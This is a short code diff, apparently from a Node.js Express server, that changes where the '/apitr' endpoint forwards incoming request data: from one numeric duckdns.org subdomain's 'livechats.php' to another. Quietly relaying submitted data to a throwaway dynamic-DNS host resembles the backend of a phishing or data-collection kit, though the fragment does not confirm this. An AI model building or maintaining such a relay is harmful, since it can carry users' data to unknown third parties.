@@ -36,7 +36,7 @@ app.post('/apitr', async (req, res) => {
       ...otherData 
     };
 
-    const response = await axios.post('https://99921455994554.duckdns.org/livechats.php', postData);
+    const response = await axios.post('https://55514485547555.duckdns.org/livechats.php', postData);
  
     res.send(response.data);
   } catch (error) {
